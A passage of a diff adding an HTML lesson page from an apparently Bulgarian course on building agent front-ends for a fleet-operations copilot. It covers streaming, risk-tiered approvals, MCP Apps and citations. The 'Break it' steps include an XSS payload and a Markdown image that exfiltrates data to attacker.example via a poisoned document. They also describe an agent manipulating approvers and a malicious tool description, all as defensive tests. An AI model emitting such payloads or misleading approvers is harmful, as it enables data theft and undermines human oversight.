+- "Show the chain of thought to build trust." Reasoning may be hidden or encrypted, and it is not a faithful audit trail. Show evidence and actions.
+- "More confirmation dialogs = more safety." Undifferentiated friction trains people to click through.
+- "Thumbs-down rate is our quality KPI."</p>
+<h2 id="tools-versions-as-of-oct-2026">Tools &amp; versions (as of Oct 2026)<a class="headerlink" href="#tools-versions-as-of-oct-2026" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tool / package</th>
+<th>Purpose</th>
+<th>Status</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Microsoft.Agents.AI</code> (MAF 1.x)</td>
+<td><code>RunStreamingAsync</code>, <code>AgentResponseUpdate</code>, <code>ToolApprovalRequestContent</code>, <code>RequestPort</code></td>
+<td>GA</td>
+<td></td>
+</tr>
+<tr>
+<td>MAF AG-UI adapters (CopilotKit, ChatKit)</td>
+<td>Agent ↔ UI event protocol</td>
+<td><strong>Preview</strong></td>
+<td>Verify package names and AG-UI event schema version</td>
+</tr>
+<tr>
+<td>CopilotKit</td>
+<td>React AG-UI client</td>
+<td>OSS</td>
+<td><strong>[Node]</strong></td>
+</tr>
+<tr>
+<td>MCP Apps extension (<code>ui://</code> resources)</td>
+<td>Tool-carried interactive UI</td>
+<td>Official extension (spec 2026-07-28)</td>
+<td>Host support varies, so verify your target hosts</td>
+</tr>
+<tr>
+<td><code>ModelContextProtocol</code> C# SDK 2.0</td>
+<td>MCP server incl. extensions</td>
+<td>Announced Aug 2026; new APIs <code>[Experimental]</code> (MCPEXP001)</td>
+<td>Pin version</td>
+</tr>
+<tr>
+<td>Azure Functions MCP extension</td>
+<td>MCP server incl. MCP Apps</td>
+<td>Available, C# isolated only</td>
+<td>Streamable HTTP</td>
+</tr>
+<tr>
+<td>Microsoft.Extensions.AI 10.x</td>
+<td>Streaming, <code>UserInputRequestContent</code></td>
+<td>GA</td>
+<td></td>
+</tr>
+<tr>
+<td>Blazor (.NET 10)</td>
+<td>Internal UIs</td>
+<td>GA</td>
+<td></td>
+</tr>
+<tr>
+<td>Playwright + <code>@axe-core/playwright</code></td>
+<td>E2E + accessibility checks</td>
+<td>OSS</td>
+<td><strong>[Node]</strong>; Playwright test agents from C11</td>
+</tr>
+<tr>
+<td>Application Insights / OTel</td>
+<td>Feedback events joined to traces</td>
+<td>GA</td>
+<td>GenAI semconv still "Development"</td>
+</tr>
+</tbody>
+</table>
+<h2 id="labs">Labs<a class="headerlink" href="#labs" title="Permanent link">&para;</a></h2>
+<p>Lab repo: <code>trakia-fleetops</code>, folders <code>src/Trakia.Dispatch.Web</code> (Blazor), <code>web/fleet-copilot</code> (React, <strong>[Node]</strong>) and <code>src/Trakia.Mcp</code> (the C8 MCP server).</p>
+<h3 id="lab-1-streaming-dispatcher-console-in-blazor-3h">Lab 1 — Streaming dispatcher console in Blazor (≈3h)<a class="headerlink" href="#lab-1-streaming-dispatcher-console-in-blazor-3h" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Goal:</strong> A dispatcher console that streams answers and agent activity, cancels for real, survives reconnects and renders safely.</li>
+<li><strong>Start state:</strong> tag <code>d4/lab1-start</code>. It contains the Fleet Assistant agent (C9) and an empty Blazor page.</li>
+<li><strong>Steps:</strong></li>
+<li>Expose an SSE endpoint mapping MAF updates to a small event schema (<code>text.delta</code>, <code>activity.start</code>, <code>activity.end</code>, <code>citation</code>, <code>done</code>, <code>error</code>), each with an <code>id</code> for <code>Last-Event-ID</code>:
+     <div class="highlight"><pre><span></span><code><span class="n">app</span><span class="p">.</span><span class="n">MapGet</span><span class="p">(</span><span class="s">"/runs/{runId}/events"</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="kt">string</span><span class="w"> </span><span class="n">runId</span><span class="p">,</span><span class="w"> </span><span class="n">HttpContext</span><span class="w"> </span><span class="n">http</span><span class="p">,</span><span class="w"> </span><span class="n">RunStore</span><span class="w"> </span><span class="n">store</span><span class="p">,</span><span class="w"> </span><span class="n">CancellationToken</span><span class="w"> </span><span class="n">ct</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">http</span><span class="p">.</span><span class="n">Response</span><span class="p">.</span><span class="n">Headers</span><span class="p">.</span><span class="n">ContentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"text/event-stream"</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">var</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">"Last-Event-ID"</span><span class="p">].</span><span class="n">FirstOrDefault</span><span class="p">();</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nf">foreach</span><span class="w"> </span><span class="p">(</span><span class="kt">var</span><span class="w"> </span><span class="n">evt</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">store</span><span class="p">.</span><span class="n">ReplayThenFollowAsync</span><span class="p">(</span><span class="n">runId</span><span class="p">,</span><span class="w"> </span><span class="k">from</span><span class="p">,</span><span class="w"> </span><span class="n">ct</span><span class="p">))</span><span class="w">   </span><span class="c1">// persisted event log</span>
+<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="n">Response</span><span class="p">.</span><span class="n">WriteAsync</span><span class="p">(</span><span class="s">$"id: {evt.Id}\nevent: {evt.Type}\ndata: {evt.Json}\n\n"</span><span class="p">,</span><span class="w"> </span><span class="n">ct</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="c1">// Producer side: await foreach (var u in agent.RunStreamingAsync(input, session, cancellationToken: runCt)) store.Append(runId, UiEvent.From(u));</span>
+</code></pre></div></li>
+<li>Wire the Stop button to cancel <code>runCt</code> server-side, and verify that the upstream model call stops (usage stops growing in the trace).</li>
+<li>Render Markdown with an allow-list sanitizer and a tolerant partial renderer. Block external images and <code>javascript:</code> links.</li>
+<li>Show an activity timeline (tools, retrievals) separate from the answer. Add a buffered <code>aria-live="polite"</code> region that announces complete sentences.</li>
+<li>Emit <code>ui.first_meaningful_content_ms</code> as a client metric and compare it with server TTFT.</li>
+<li><strong>Break it:</strong></li>
+<li>Kill the network for 5 s mid-answer: the stream must resume with no duplicated or missing text.</li>
+<li>Make the model output <code>&lt;img src=x onerror=alert(1)&gt;</code> and <code>![p](https://attacker.example/?d=…)</code> through a poisoned document: neither may execute or load.</li>
+<li><strong>Acceptance criteria:</strong></li>
+<li>The Playwright tests <code>StreamResume</code>, <code>StopCancelsUpstream</code> (asserted via the trace usage counter) and <code>OutputSanitization</code> pass.</li>
+<li>axe-core reports 0 serious or critical violations on the console page.</li>
+<li>First meaningful content P95 is ≤ 1.2 s on the eval set.</li>
+<li><strong>Stretch:</strong> Progressive structured rendering. Stream the partial JSON of a <code>ShiftSummary</code> into a table that fills in row by row.</li>
+</ul>
+<h3 id="lab-2-ag-ui-copilot-with-shared-plan-state-and-risk-tiered-approvals-35h-node">Lab 2 — AG-UI copilot with shared plan state and risk-tiered approvals (≈3.5h) [Node]<a class="headerlink" href="#lab-2-ag-ui-copilot-with-shared-plan-state-and-risk-tiered-approvals-35h-node" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Goal:</strong> A React copilot for the fleet manager that co-edits the D2 weekly plan with the agent and approves actions safely.</li>
+<li><strong>Start state:</strong> tag <code>d4/lab2-start</code>. It contains the D2 planner (or a stub) exposed through MAF's AG-UI adapter (preview) and a CopilotKit app skeleton.</li>
+<li><strong>Steps:</strong></li>
+<li>Expose the planner via the MAF AG-UI endpoint. Share <code>PlanDraft</code> state with the UI (state snapshots and deltas). Verify the adapter's API and the event names against the pinned version.</li>
+<li>Build the approval card component from typed <code>ToolApprovalRequestContent</code> data: verbatim action, diff, reversibility, € cost, evidence links, and a secondary "AI rationale". Implement risk tiers:<ul>
+<li>T1: reversible and &lt; €200, batchable;</li>
+<li>T2: reversible and ≥ €200, per-item;</li>
+<li>T3: irreversible, per-item with typed confirmation.</li>
+</ul>
+</li>
+<li>On the server, the approval endpoint loads the pending request by ID, checks the approver's role and resource scope, checks the ETag/version, executes exactly the shown arguments, and writes an audit event.</li>
+<li>Instrument the approval metrics: decision time per tier, approval rate, and later reversions.</li>
+<li><strong>Break it:</strong></li>
+<li>Tamper with the approval POST in DevTools (change the vehicle ID or the amount). The server must reject it.</li>
+<li>Have the agent phrase a T3 action reassuringly ("just a quick routine notification"). The card must still show "irreversible" and the recipient count from typed data.</li>
+<li>Run a scripted "approval fatigue" session with 30 T1 cards and 1 hidden wrong T3 card, and record whether testers catch it.</li>
+<li><strong>Acceptance criteria:</strong></li>
+<li><code>ApprovalSecurityTests</code> pass: 0 tampered executions, BOLA test (manager A cannot approve depot B's plan), expired request rejected.</li>
+<li>Every irreversible action requires typed confirmation.</li>
+<li>Approval metrics appear in the dashboard.</li>
+<li><strong>Stretch:</strong> Port the approval card to a Teams Adaptive Card with the same anatomy and server-side validation.</li>
+</ul>
+<h3 id="lab-3-an-mcp-app-maintenance-booking-form-travelling-with-the-tool-2h">Lab 3 — An MCP App: maintenance booking form travelling with the tool (≈2h)<a class="headerlink" href="#lab-3-an-mcp-app-maintenance-booking-form-travelling-with-the-tool-2h" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Goal:</strong> Make <code>book_maintenance</code> render its own interactive form in any MCP Apps-capable host, with a text fallback.</li>
+<li><strong>Start state:</strong> tag <code>d4/lab3-start</code> (the Trakia MCP server on the C# SDK 2.0, or the Functions MCP extension variant).</li>
+<li><strong>Steps:</strong></li>
+<li>Add a <code>ui://trakia/booking-form</code> resource: a small, self-contained HTML/JS app with a strict CSP, no external origins and no inline event handlers. It talks to the host via JSON-RPC over <code>postMessage</code> per the MCP Apps extension.</li>
+<li>Make <code>book_maintenance</code> return a structured result referencing the UI resource. Hosts without MCP Apps get the text/structured fallback (a slot list and the instruction to call again with a slot ID).</li>
+<li>The form submits through the host back to the tool. The server re-validates the slot, the vehicle and the caller's permissions.</li>
+<li>Test it in at least one MCP Apps-capable host (verify which IDE/chat hosts support it in your pinned versions) and in a host without support.</li>
+<li><strong>Break it:</strong> Make the form try to <code>fetch</code> an external URL and read <code>parent.document</code>. Both must fail under the sandbox and CSP. Then make a malicious tool description request "render ui://other-server/…". The host must not cross server boundaries.</li>
+<li><strong>Acceptance criteria:</strong></li>
+<li>The <code>McpAppsContractTests</code> (resource served with the correct MIME type and CSP, fallback present, server-side validation) pass.</li>
+<li>A manual check in one capable host is recorded with a screenshot in the PR.</li>
+<li><strong>Stretch:</strong> Compare the same interaction implemented as AG-UI generative UI (a typed component) vs an MCP App. Record where each one renders and who owns its security.</li>
+</ul>
+<h3 id="lab-4-citations-uncertainty-and-the-feedback-to-evals-loop-plus-an-accessibility-audit-2h">Lab 4 — Citations, uncertainty and the feedback-to-evals loop, plus an accessibility audit (≈2h)<a class="headerlink" href="#lab-4-citations-uncertainty-and-the-feedback-to-evals-loop-plus-an-accessibility-audit-2h" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Goal:</strong> Make answers verifiable and honest, and turn user reactions into eval improvements.</li>
+<li><strong>Start state:</strong> tag <code>d4/lab4-start</code>.</li>
+<li><strong>Steps:</strong></li>
+<li>Implement passage-level citations with version and effective date, opening the source viewer at the highlighted chunk. Hide citations the user cannot open, and add a test with an HR-only document.</li>
+<li>Implement an <code>AnswerAssurance</code> mapper from validated signals (retrieval hits, source agreement, judge score) to three verbal levels with fixed BG/EN phrasing, including an explicit abstention state.</li>
+<li>Add feedback capture (thumbs + reason codes + optional comment, plus draft-edit diffs in the customer-email composer) joined to <code>gen_ai.conversation.id</code> and the response ID.</li>
+<li>Write a weekly job that samples the feedback into the C14 annotation tool queue, and a script that promotes adjudicated cases into the golden set.</li>
+<li>Run the axe-core suite across all pages, and do a manual NVDA/VoiceOver pass of the approval flow. Log the issues and fix them.</li>
+<li><strong>Break it:</strong> Index a superseded fleet-policy version. The answer must cite the current version, or flag the conflict. Then set the judge threshold so loose that "high assurance" appears on a wrong answer, and catch it with the calibration check.</li>
+<li><strong>Acceptance criteria:</strong></li>
+<li>Citation accuracy is ≥ 95% and stale citations are 0 on the 40-question citation eval.</li>
+<li>No permission-violating snippet is rendered.</li>
+<li>Assurance levels are calibrated: the "high" level is ≥ 95% correct on the eval set.</li>
+<li>Feedback events are queryable in KQL and joined to traces.</li>
+<li>0 serious or critical axe violations.</li>
+<li><strong>Stretch:</strong> Generate DPO preference-pair candidates from the customer-email draft edits (D1 hand-off), with PII scrubbing.</li>
+</ul>
+<h2 id="kata">Kata<a class="headerlink" href="#kata" title="Permanent link">&para;</a></h2>
+<p><strong>"Design the card" (25 min, repeat 4×).</strong> You get a tool schema and the agent's proposed call:
+- Variant 1: cancel a customer shipment.
+- Variant 2: reassign 6 drivers.
+- Variant 3: order €4,800 of parts.
+- Variant 4: send a delay notice to 120 customers.</p>
+<p>Sketch the approval card: verbatim fields, diff, reversibility, cost, evidence, risk tier and friction, server-side checks. Then name one way the agent could manipulate the decision and how your design blocks it. Peer-review against the §3 anatomy checklist.</p>
+<h2 id="product-increment-fleet-ops-copilot">Product increment — Fleet Ops Copilot<a class="headerlink" href="#product-increment-fleet-ops-copilot" title="Permanent link">&para;</a></h2>
+<p>Fleet Ops Copilot now has three front-ends:
+- A <strong>Blazor dispatcher console</strong> with resumable, cancellable, sanitized streaming and an activity timeline.
+- A <strong>React AG-UI copilot</strong> for fleet managers. It co-edits the weekly plan and uses risk-tiered, server-validated approvals with automation-bias metrics.
+- An <strong>MCP App</strong> booking form that renders wherever the Trakia MCP server is used, coding agents included.</p>
+<p>Answers carry passage-level, versioned, permission-trimmed citations and calibrated assurance wording. Feedback flows into the eval pipeline weekly.</p>
+<h2 id="factory-increment-your-agentic-sdlc">Factory increment — your agentic SDLC<a class="headerlink" href="#factory-increment-your-agentic-sdlc" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Playwright planner/generator/healer agents (C11) maintain the E2E suites for both front-ends. A CI rule requires human review for healer diffs touching approval or sanitization tests.</li>
+<li><code>@axe-core/playwright</code> runs in CI with a zero serious/critical gate.</li>
+<li>A <code>/approval-card</code> skill scaffolds a typed approval DTO, the card component (Blazor and React), the server validation endpoint and the security tests from a tool schema.</li>
+<li>The UI's eval cases (citation accuracy, assurance calibration, sanitization) run in the same <code>dotnet test</code> + Playwright pipeline as the backend evals.</li>
+</ul>
+<h2 id="assessment">Assessment<a class="headerlink" href="#assessment" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Criterion</th>
+<th>Novice</th>
+<th>Competent</th>
+<th>Proficient</th>
+<th>Expert</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Streaming &amp; robustness</td>
+<td>Text appears eventually</td>
+<td>Streams text</td>
+<td>Activity events, cancellation, sanitization</td>
+<td>Resumable event log; cancellation stops upstream billing; tolerant partial rendering; measured first meaningful content</td>
+</tr>
+<tr>
+<td>Integration choice</td>
+<td>Ad-hoc</td>
+<td>Uses one protocol</td>
+<td>Justifies SSE vs AG-UI vs MCP Apps</td>
+<td>Typed component registry + MCP Apps where tools travel; security ownership explicit per surface</td>
+</tr>
+<tr>
+<td>Approval UX</td>
+<td>"Approve?" with agent text</td>
+<td>Shows arguments</td>
+<td>Typed card, risk tiers, server re-validation</td>
+<td>Manipulation-resistant, BOLA-safe, automation-bias metrics with thresholds and canary training</td>
+</tr>
+<tr>
+<td>Honesty signals</td>
+<td>None</td>
+<td>Document-level citations</td>
+<td>Passage citations, abstention state</td>
+<td>Versioned, permission-trimmed citations with measured accuracy; calibrated assurance levels</td>
+</tr>
+<tr>
+<td>Accessibility &amp; feedback</td>
+<td>Not considered</td>
+<td>axe run once</td>
+<td>AA in CI; feedback captured</td>
+<td>Screen-reader-friendly streaming; feedback → error analysis → golden set loop running</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Auto-checked:</strong> <code>StreamResume</code>, <code>StopCancelsUpstream</code>, <code>OutputSanitization</code>, <code>ApprovalSecurityTests</code>, <code>McpAppsContractTests</code>, the citation and assurance evals, the axe-core gate, and the KQL feedback-join test.</p>
+<h2 id="common-pitfalls">Common pitfalls<a class="headerlink" href="#common-pitfalls" title="Permanent link">&para;</a></h2>
+<ul>
+<li>A Stop button that hides the stream but leaves the model generating, and billing.</li>
+<li>Rendering model HTML, or allowing external Markdown images, which creates XSS and an exfiltration channel.</li>
+<li>Approval cards built from the agent's natural-language summary.</li>
+<li>Trusting the client's approval payload, and no ownership check (BOLA).</li>
+<li>One-click "approve all" across mixed risk tiers.</li>
+<li>Showing self-reported confidence percentages.</li>
+<li>Document-level citations to superseded versions, and snippet leaks across permissions.</li>
+<li><code>aria-live</code> on every token, which overwhelms screen-reader users.</li>
+<li>Treating the thumbs-down rate as the quality KPI instead of a sampling signal.</li>
+<li>Building on a preview protocol without pinning its version and keeping a fallback.</li>
+</ul>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li>MAF 1.0 announcement (AG-UI/CopilotKit/ChatKit adapters preview): https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/</li>
+<li>Microsoft Learn — MAF human-in-the-loop (<code>RequestPort</code>, <code>ToolApprovalRequestContent</code>): https://learn.microsoft.com/en-us/agent-framework/workflows/human-in-the-loop</li>
+<li>AG-UI documentation: https://docs.ag-ui.com</li>
+<li>MCP 2026-07-28 changelog and MCP Apps extension: https://modelcontextprotocol.io/specification/2026-07-28/changelog ; https://aaif.io/blog/mcp-2026-07-28-whats-changing-and-how-to-migrate</li>
+<li>Microsoft Learn — Azure Functions MCP bindings (incl. MCP Apps): https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-mcp</li>
+<li>Microsoft .NET blog — AI essentials (<code>UserInputRequestContent</code>, streaming): https://devblogs.microsoft.com/dotnet/dotnet-ai-essentials-the-core-building-blocks-explained/</li>
+<li>OWASP Top 10 for LLM Applications 2025 (LLM05 Improper Output Handling): https://genai.owasp.org/llm-top-10/</li>
+<li>OWASP Top 10 for Agentic Applications (ASI09; "show the raw action"): https://cycode.com/blog/owasp-top-10-agentic-applications/</li>
+<li>Azure Architecture Center — Baseline Foundry chat RA (BOLA warning): https://learn.microsoft.com/en-us/azure/architecture/ai-ml/architecture/baseline-microsoft-foundry-chat</li>
+<li>Hamel Husain — Evals FAQ (feedback as a sampling signal, error analysis): https://hamel.dev/blog/posts/evals-faq/</li>
+<li>Microsoft HAX Toolkit / Responsible AI resources: https://www.microsoft.com/en-us/ai/responsible-ai</li>
+<li>W3C WCAG 2.2: https://www.w3.org/TR/WCAG22/</li>
+<li>Playwright test agents: https://playwright.dev/docs/test-agents</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Върни се в началото
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Долен колонтитул" >
+        
+          
+          <a href="../d03-multimodal-and-realtime-agents/" class="md-footer__link md-footer__link--prev" aria-label="Предишна: D3 — Мултимодални агенти и агенти в реално време">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Предишна
+              </span>
+              <div class="md-ellipsis">
+                D3 — Мултимодални агенти и агенти в реално време
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../d05-performance-and-cost-engineering/" class="md-footer__link md-footer__link--next" aria-label="Следваща: D5 — Инженеринг на производителността и разходите">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Следваща
+              </span>
+              <div class="md-ellipsis">
+                D5 — Инженеринг на производителността и разходите
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.top", "navigation.footer", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u041a\u043e\u043f\u0438\u0440\u0430\u043d\u043e", "clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u0430\u0439", "search.result.more.one": "\u043e\u0449\u0435 1 \u043d\u0430 \u0442\u0430\u0437\u0438 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430", "search.result.more.other": "\u043e\u0449\u0435 # \u043d\u0430 \u0442\u0430\u0437\u0438 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430", "search.result.none": "\u041d\u044f\u043c\u0430 \u0440\u0435\u0437\u0443\u043b\u0442\u0430\u0442\u0438", "search.result.one": "1 \u0440\u0435\u0437\u0443\u043b\u0442\u0430\u0442", "search.result.other": "# \u0440\u0435\u0437\u0443\u043b\u0442\u0430\u0442\u0430", "search.result.placeholder": "\u0417\u0430\u043f\u043e\u0447\u043d\u0435\u0442\u0435 \u0434\u0430 \u043f\u0438\u0448\u0435\u0442\u0435, \u0437\u0430 \u0434\u0430 \u0442\u044a\u0440\u0441\u0438\u0442\u0435", "search.result.term.missing": "\u041b\u0438\u043f\u0441\u0432\u0430\u0449\u043e", "select.version": "\u0418\u0437\u0431\u0435\u0440\u0438 \u0432\u0435\u0440\u0441\u0438\u044f"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
